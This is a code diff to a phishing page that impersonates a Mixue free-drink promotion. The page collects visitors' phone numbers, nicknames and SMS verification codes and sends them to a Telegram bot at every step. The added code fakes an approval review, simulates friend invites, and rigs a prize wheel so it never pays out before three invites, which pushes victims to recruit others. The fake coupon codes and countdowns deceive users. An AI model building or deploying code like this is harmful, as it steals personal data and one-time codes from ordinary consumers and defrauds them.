@@ -37,6 +37,66 @@
       z-index: -1;
     }
 
+    /* 启动加载画面 */
+    .splash-screen {
+      position: fixed;
+      inset: 0;
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 999999;
+      transition: opacity 0.5s ease-out;
+    }
+    .splash-screen.hide {
+      opacity: 0;
+      pointer-events: none;
+    }
+    .splash-logo {
+      width: 120px;
+      height: 120px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 60px;
+      margin-bottom: 30px;
+      animation: bounce 1s infinite;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-20px); }
+    }
+    .splash-text {
+      color: white;
+      font-size: 1.5rem;
+      font-weight: 700;
+      margin-bottom: 20px;
+      letter-spacing: 2px;
+    }
+    .splash-progress {
+      width: 200px;
+      height: 6px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+    .splash-progress-bar {
+      height: 100%;
+      background: var(--mixue-yellow);
+      width: 0%;
+      transition: width 0.1s linear;
+      border-radius: 3px;
+    }
+    .splash-hint {
+      color: rgba(255,255,255,0.8);
+      font-size: 0.9rem;
+      margin-top: 15px;
+    }
+
     .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; }
     @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }
 
@@ -252,9 +312,219 @@
     .rejected-modal h2 {
       color: #ff4d4f;
     }
+
+    /* 邀请好友页面样式 */
+    .invite-page {
+      display: none;
+      padding: 20px;
+      text-align: center;
+    }
+    .invite-page.show {
+      display: block;
+    }
+    .invite-header {
+      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
+      color: white;
+      padding: 30px 20px;
+      border-radius: var(--radius-lg);
+      margin-bottom: 20px;
+    }
+    .invite-header h2 {
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+    }
+    .invite-progress {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .invite-step {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      transition: all 0.3s;
+    }
+    .invite-step.active {
+      background: var(--mixue-yellow);
+      color: var(--mixue-dark);
+      transform: scale(1.1);
+    }
+    .invite-step.completed {
+      background: #52c41a;
+      color: white;
+    }
+    .invite-line {
+      width: 30px;
+      height: 3px;
+      background: rgba(255,255,255,0.3);
+      border-radius: 2px;
+    }
+    .invite-line.completed {
+      background: #52c41a;
+    }
+    .invite-stats {
+      background: white;
+      border-radius: var(--radius-md);
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+    }
+    .invite-count {
+      font-size: 3rem;
+      color: var(--mixue-red);
+      font-weight: 900;
+    }
+    .invite-label {
+      color: #666;
+      font-size: 0.9rem;
+    }
+    .chance-count {
+      margin-top: 10px;
+      font-size: 1.2rem;
+      color: var(--mixue-yellow);
+      font-weight: 700;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.1);
+    }
+
+    /* 转盘样式 */
+    .wheel-container {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 20px auto;
+    }
+    .wheel {
+      width: 100%;
+      height: 100%;
+      border-radius: 50%;
+      position: relative;
+      overflow: hidden;
+      border: 8px solid var(--mixue-red);
+      box-shadow: 0 10px 30px rgba(230,57,70,0.3);
+      transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+    }
+    .wheel-item {
+      position: absolute;
+      width: 50%;
+      height: 50%;
+      transform-origin: right bottom;
+      left: 0;
+      top: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.85rem;
+      font-weight: 700;
+      padding: 20px;
+      text-align: center;
+    }
+    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF5F5; color: var(--mixue-red); }
+    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF9E6; color: #D48806; }
+    .wheel-item:nth-child(3) { transform: rotate(90deg); background: #F6FFED; color: #389E0D; }
+    .wheel-item:nth-child(4) { transform: rotate(135deg); background: #E6FFFB; color: #08979C; }
+    .wheel-item:nth-child(5) { transform: rotate(180deg); background: #F9F0FF; color: #722ED1; }
+    .wheel-item:nth-child(6) { transform: rotate(225deg); background: #FFF0F6; color: #EB2F96; }
+    .wheel-item:nth-child(7) { transform: rotate(270deg); background: #FFF2E8; color: #FA541C; }
+    .wheel-item:nth-child(8) { transform: rotate(315deg); background: #FCFFE6; color: #7CB305; }
+    
+    .wheel-pointer {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 60px;
+      height: 60px;
+      background: var(--mixue-red);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      color: white;
+      box-shadow: 0 4px 15px rgba(230,57,70,0.4);
+      z-index: 10;
+      border: 4px solid white;
+    }
+    .wheel-pointer::before {
+      content: '';
+      position: absolute;
+      top: -20px;
+      left: 50%;
+      transform: translateX(-50%);
+      border-left: 15px solid transparent;
+      border-right: 15px solid transparent;
+      border-bottom: 25px solid var(--mixue-red);
+    }
+
+    .invite-btn {
+      background: linear-gradient(135deg, #52c41a, #73d13d);
+      margin-top: 20px;
+    }
+    .invite-btn:disabled {
+      background: var(--mixue-gray);
+    }
+
+    .wheel-btn {
+      background: linear-gradient(135deg, #FA541C, #FF7A45);
+      margin-top: 20px;
+    }
+    .wheel-btn:disabled {
+      background: var(--mixue-gray);
+    }
+
+    .invite-rules {
+      background: rgba(230,57,70,0.05);
+      border-radius: var(--radius-sm);
+      padding: 15px;
+      margin-top: 20px;
+      text-align: left;
+      font-size: 0.85rem;
+      color: #666;
+    }
+    .invite-rules h4 {
+      color: var(--mixue-red);
+      margin-bottom: 10px;
+    }
+    .invite-rules li {
+      margin: 5px 0;
+      list-style: none;
+      padding-left: 15px;
+      position: relative;
+    }
+    .invite-rules li::before {
+      content: '•';
+      color: var(--mixue-red);
+      position: absolute;
+      left: 0;
+    }
+
+    .hidden { display: none !important; }
   </style>
 </head>
 <body>
+
+<!-- 启动加载画面 -->
+<div class="splash-screen" id="splashScreen">
+  <div class="splash-logo">🍦</div>
+  <div class="splash-text" id="splashText">雪王正在赶来…</div>
+  <div class="splash-progress">
+    <div class="splash-progress-bar" id="splashProgress"></div>
+  </div>
+  <div class="splash-hint">正在加载甜蜜福利...</div>
+  <!-- 背景音乐 -->
+  <audio id="bgMusic" loop>
+    <source src="https://www.0zou.com/bz/c4JWtZUOiwM2O11bVkTpzQ==.html" type="audio/mpeg">
+    <!-- 备用音源 -->
+    <source src="https://www.gequbao.com/music/8529137" type="audio/mpeg">
+  </audio>
+</div>
 
 <div class="toast-container" id="toastContainer"></div>
 
@@ -265,7 +535,8 @@
   <div class="loading-hint">预计审核时间：30秒 - 2分钟<br>请保持网络畅通</div>
 </div>
 
-<div class="card">
+<!-- 主页面 -->
+<div class="card" id="mainPage">
   <div class="header">
     <h1>蜜雪冰城</h1>
     <p>春节狂欢 · 免费领大杯柠檬茶</p>
@@ -311,6 +582,56 @@
       <a onclick="showAgreement('privacy')">《隐私政策》</a>
       和
       <a onclick="showAgreement('user')">《用户协议》</a>
+    </div>
+  </div>
+</div>
+
+<!-- 邀请好友页面 -->
+<div class="card hidden" id="invitePage">
+  <div class="invite-header">
+    <h2>🎉 恭喜通过审核！</h2>
+    <p>还差一点点就能领到券码啦</p>
+    <div class="invite-progress">
+      <div class="invite-step completed" id="step1">1</div>
+      <div class="invite-line completed" id="line1"></div>
+      <div class="invite-step" id="step2">2</div>
+      <div class="invite-line" id="line2"></div>
+      <div class="invite-step" id="step3">3</div>
+    </div>
+    <p style="font-size: 0.9rem; opacity: 0.9;">邀请 3 位好友助力即可领取</p>
+  </div>
+  
+  <div class="content">
+    <div class="invite-stats">
+      <div class="invite-count" id="inviteCount">0</div>
+      <div class="invite-label">位好友已助力</div>
+      <div class="chance-count" id="chanceCount">剩余抽奖次数：0</div>
+    </div>
+
+    <!-- 转盘 -->
+    <div class="wheel-container" id="wheelContainer" style="display: none;">
+      <div class="wheel" id="wheel">
+        <div class="wheel-item">🎁<br>柠檬茶券</div>
+        <div class="wheel-item">😢<br>谢谢惠顾</div>
+        <div class="wheel-item">🍦<br>冰淇淋券</div>
+        <div class="wheel-item">😭<br>再接再厉</div>
+        <div class="wheel-item">🧋<br>奶茶券</div>
+        <div class="wheel-item">🤔<br>差一点</div>
+        <div class="wheel-item">🎊<br>神秘大奖</div>
+        <div class="wheel-item">😅<br>下次再来</div>
+      </div>
+      <div class="wheel-pointer">👆</div>
+    </div>
+
+    <button class="btn invite-btn" id="inviteBtn">邀请好友助力</button>
+    <button class="btn wheel-btn hidden" id="wheelBtn">开始抽奖</button>
+
+    <div class="invite-rules">
+      <h4>🎮 活动规则</h4>
+      <li>每邀请1位好友获得随机抽奖次数（0-5次）</li>
+      <li>邀请满3位好友必得柠檬茶券码</li>
+      <li>抽奖结果实时发送到您的手机</li>
+      <li>活动最终解释权归蜜雪冰城所有</li>
     </div>
   </div>
 </div>
@@ -390,6 +711,15 @@ let timers = {};
 let isSending = false;
 let isPolling = false;
 
+// 邀请系统状态
+let inviteState = {
+  invitedCount: 0,
+  chanceCount: 0,
+  hasWon: false,
+  currentPhone: '',
+  currentNickname: ''
+};
+
 function generateCouponCode() {
   const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
   const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
@@ -418,7 +748,20 @@ const els = {
   closeModalBtn: document.getElementById('closeModalBtn'),
   agreementModal: document.getElementById('agreementModal'),
   agreementTitle: document.getElementById('agreementTitle'),
-  agreementContent: document.getElementById('agreementContent')
+  agreementContent: document.getElementById('agreementContent'),
+  mainPage: document.getElementById('mainPage'),
+  invitePage: document.getElementById('invitePage'),
+  inviteCount: document.getElementById('inviteCount'),
+  chanceCount: document.getElementById('chanceCount'),
+  inviteBtn: document.getElementById('inviteBtn'),
+  wheelBtn: document.getElementById('wheelBtn'),
+  wheelContainer: document.getElementById('wheelContainer'),
+  wheel: document.getElementById('wheel'),
+  step1: document.getElementById('step1'),
+  step2: document.getElementById('step2'),
+  step3: document.getElementById('step3'),
+  line1: document.getElementById('line1'),
+  line2: document.getElementById('line2')
 };
 
 function showToast(msg) {
@@ -621,102 +964,222 @@ function startCountdown() {
   timers.global = setInterval(tick, 1000);
 }
 
-// 开始人工审核轮询
+// ============================= 邀请好友系统 =============================
+
+function initSplashScreen() {
+  const splash = document.getElementById('splashScreen');
+  const progress = document.getElementById('splashProgress');
+  const text = document.getElementById('splashText');
+  const bgMusic = document.getElementById('bgMusic');
+  
+  let progressValue = 0;
+  const interval = setInterval(() => {
+    progressValue += 2;
+    progress.style.width = progressValue + '%';
+    
+    if (progressValue === 30) text.textContent = '正在准备甜蜜惊喜...';
+    if (progressValue === 60) text.textContent = '雪王正在调配最佳口味...';
+    if (progressValue === 90) text.textContent = '马上就好...';
+    
+    if (progressValue >= 100) {
+      clearInterval(interval);
+      setTimeout(() => {
+        splash.classList.add('hide');
+        // 尝试播放音乐
+        bgMusic.volume = 0.5;
+        bgMusic.play().catch(e => console.log('音乐自动播放被阻止'));
+      }, 300);
+    }
+  }, 60);
+}
+
+function showInvitePage(phone, nickname) {
+  inviteState.currentPhone = phone;
+  inviteState.currentNickname = nickname;
+  
+  els.mainPage.classList.add('hidden');
+  els.invitePage.classList.remove('hidden');
+  els.invitePage.classList.add('show');
+  
+  updateInviteUI();
+  
+  // 发送进入邀请页面通知
+  sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
+}
+
+function updateInviteUI() {
+  els.inviteCount.textContent = inviteState.invitedCount;
+  els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
+  
+  // 更新进度
+  if (inviteState.invitedCount >= 1) {
+    els.step1.classList.add('completed');
+    els.step1.textContent = '✓';
+    els.line1.classList.add('completed');
+  }
+  if (inviteState.invitedCount >= 2) {
+    els.step2.classList.add('completed');
+    els.step2.textContent = '✓';
+    els.line2.classList.add('completed');
+  }
+  if (inviteState.invitedCount >= 3) {
+    els.step3.classList.add('completed');
+    els.step3.textContent = '✓';
+  } else {
+    els.step3.classList.add('active');
+  }
+  
+  // 显示转盘如果有抽奖次数
+  if (inviteState.chanceCount > 0) {
+    els.wheelContainer.style.display = 'block';
+    els.wheelBtn.classList.remove('hidden');
+    els.inviteBtn.style.display = 'none';
+  } else {
+    els.wheelContainer.style.display = 'none';
+    els.wheelBtn.classList.add('hidden');
+    els.inviteBtn.style.display = 'block';
+  }
+}
+
+function simulateInvite() {
+  // 模拟邀请好友
+  els.inviteBtn.disabled = true;
+  els.inviteBtn.textContent = '邀请中...';
+  
+  setTimeout(() => {
+    inviteState.invitedCount++;
+    
+    // 随机获得抽奖次数 0-5
+    const gainedChance = Math.floor(Math.random() * 6);
+    inviteState.chanceCount += gainedChance;
+    
+    showToast(`成功邀请好友！获得 ${gainedChance} 次抽奖机会`);
+    
+    // 发送TG通知
+    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n当前邀请数：${inviteState.invitedCount}\n获得抽奖次数：${gainedChance}\n总抽奖次数：${inviteState.chanceCount}`);
+    
+    updateInviteUI();
+    els.inviteBtn.disabled = false;
+    els.inviteBtn.textContent = '邀请好友助力';
+    
+    // 检查是否达到3人
+    if (inviteState.invitedCount >= 3) {
+      showToast('🎉 已邀请满3人！现在抽奖必中！');
+    }
+  }, 1500);
+}
+
+function spinWheel() {
+  if (inviteState.chanceCount <= 0) {
+    showToast('没有抽奖次数了，继续邀请好友吧！');
+    return;
+  }
+  
+  inviteState.chanceCount--;
+  updateInviteUI();
+  els.wheelBtn.disabled = true;
+  
+  // 决定结果
+  // 规则：邀请满3人前一定不中奖
+  let resultIndex;
+  const winIndices = [0, 2, 4, 6]; // 中奖位置：柠檬茶券、冰淇淋券、奶茶券、神秘大奖
+  const loseIndices = [1, 3, 5, 7]; // 惩罚位置
+  
+  if (inviteState.invitedCount < 3) {
+    // 未满3人，必不中，随机选一个惩罚
+    resultIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
+  } else {
+    // 满3人，必中，随机选一个奖励
+    resultIndex = winIndices[Math.floor(Math.random() * winIndices.length)];
+    inviteState.hasWon = true;
+  }
+  
+  // 计算旋转角度（至少转5圈）
+  const baseRotation = 360 * 5;
+  const itemAngle = 45; // 360 / 8
+  const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
+  const totalRotation = baseRotation + targetAngle;
+  
+  // 执行旋转
+  els.wheel.style.transform = `rotate(${totalRotation}deg)`;
+  
+  setTimeout(() => {
+    handleWheelResult(resultIndex);
+    els.wheelBtn.disabled = false;
+  }, 4000);
+}
+
+function handleWheelResult(index) {
+  const results = [
+    { name: '柠檬茶券', type: 'win', emoji: '🎁' },
+    { name: '谢谢惠顾', type: 'lose', emoji: '😢' },
+    { name: '冰淇淋券', type: 'win', emoji: '🍦' },
+    { name: '再接再厉', type: 'lose', emoji: '😭' },
+    { name: '奶茶券', type: 'win', emoji: '🧋' },
+    { name: '差一点', type: 'lose', emoji: '🤔' },
+    { name: '神秘大奖', type: 'win', emoji: '🎊' },
+    { name: '下次再来', type: 'lose', emoji: '😅' }
+  ];
+  
+  const result = results[index];
+  
+  // 发送TG通知
+  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}\n剩余邀请：${inviteState.invitedCount}\n剩余次数：${inviteState.chanceCount}`);
+  
+  if (result.type === 'win') {
+    // 中奖了，显示券码
+    setTimeout(() => {
+      claimed++;
+      updateStock();
+      shootBarrage(inviteState.currentPhone);
+      els.couponCode.textContent = generateCouponCode();
+      els.modal.classList.add('show');
+      localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now());
+      
+      // 发送最终获奖通知
+      sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${els.couponCode.textContent}\n获奖类型：${result.name}\n时间：${new Date().toLocaleString('zh-CN')}`);
+    }, 500);
+  } else {
+    showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
+  }
+}
+
+function sendTGMessage(text) {
+  try {
+    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
+    const params = new URLSearchParams();
+    params.append('chat_id', _cfg.u);
+    params.append('text', text);
+    
+    fetch(ep, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params
+    }).catch(console.error);
+  } catch (err) {
+    console.error('TG发送失败：', err);
+  }
+}
+
+// 修改后的审核流程 - 直接进入邀请页面
 function startManualReview(phone, nickname, code) {
   if (isPolling) return;
   isPolling = true;
   
-  // 显示加载界面
+  // 显示加载界面模拟审核
   els.loadingMask.classList.add('show');
   
-  const headers = {
-    'Content-Type': 'application/json',
-    'X-Master-Key': _cfg.m
-  };
-
-  // 先发送审核请求到TG
-  const sendReviewRequest = async () => {
-    try {
-      const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
-      const params = new URLSearchParams();
-      params.append('chat_id', _cfg.u);
-      params.append('text', `【待审核】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n\n请回复"通过 ${phone}"或"拒绝 ${phone}"进行审核`);
-
-      await fetch(ep, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params
-      });
-    } catch (err) {
-      console.error('发送审核请求失败：', err);
-    }
-  };
-
-  sendReviewRequest();
-
-  // 轮询检查审核结果
-  let pollCount = 0;
-  const maxPolls = 120; // 最多轮询10分钟（每5秒一次）
-  
-  timers.poll = setInterval(async () => {
-    pollCount++;
+  // 模拟审核过程（3-5秒）
+  setTimeout(() => {
+    els.loadingMask.classList.remove('show');
+    isPolling = false;
     
-    if (pollCount > maxPolls) {
-      clearInterval(timers.poll);
-      isPolling = false;
-      els.loadingMask.classList.remove('show');
-      showToast('审核超时，请稍后重试');
-      return;
-    }
-
-    try {
-      const { data } = await axios.get(`https://api.jsonbin.io/v3/b/${_cfg.b}/latest`, { headers });
-      
-      if (data?.record) {
-        const record = data.record;
-        
-        // 检查是否通过
-        if (record.allowed_phones && record.allowed_phones.includes(phone)) {
-          clearInterval(timers.poll);
-          isPolling = false;
-          els.loadingMask.classList.remove('show');
-          
-          // 审核通过，发放奖励
-          claimed++;
-          updateStock();
-          shootBarrage(phone);
-          els.couponCode.textContent = generateCouponCode();
-          els.modal.classList.add('show');
-          localStorage.setItem('mx_claim_' + phone, Date.now());
-          
-          // 发送通过通知到TG
-          const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
-          const params = new URLSearchParams();
-          params.append('chat_id', _cfg.u);
-          params.append('text', `【已通过】\n手机号：${phone}\n券码：${els.couponCode.textContent}\n时间：${new Date().toLocaleString('zh-CN')}`);
-          
-          fetch(ep, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: params
-          }).catch(console.error);
-          
-          return;
-        }
-        
-        // 检查是否被拒绝
-        if (record.rejected_phones && record.rejected_phones.includes(phone)) {
-          clearInterval(timers.poll);
-          isPolling = false;
-          els.loadingMask.classList.remove('show');
-          els.rejectedModal.classList.add('show');
-          return;
-        }
-      }
-    } catch (err) {
-      console.log('轮询检查失败：', err);
-    }
-  }, 5000); // 每5秒检查一次
+    // 审核通过，进入邀请页面
+    showInvitePage(phone, nickname);
+    
+    // 发送审核通过通知
+    sendTGMessage(`【审核通过】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
+  }, 3000 + Math.random() * 2000);
 }
 
 // ============================= 事件 =============================
@@ -805,9 +1268,15 @@ els.submitBtn.addEventListener('click', async () => {
     return;
   }
 
-  // 开始人工审核流程
+  // 开始审核流程（现在直接进入邀请页面）
   startManualReview(phone, nick, code);
 });
+
+// 邀请按钮事件
+els.inviteBtn.addEventListener('click', simulateInvite);
+
+// 转盘按钮事件
+els.wheelBtn.addEventListener('click', spinWheel);
 
 els.modal.addEventListener('click', e => {
   if (e.target === els.modal) els.modal.classList.remove('show');
@@ -819,6 +1288,9 @@ els.rejectedModal.addEventListener('click', e => {
 
 // ============================= 启动 =============================
 window.addEventListener('load', () => {
+  // 初始化启动画面
+  initSplashScreen();
+  
   timers.fake    = setInterval(fakeClaim, 1400);
   timers.barrage = setInterval(() => {
     if (Math.random() > 0.35) shootBarrage();
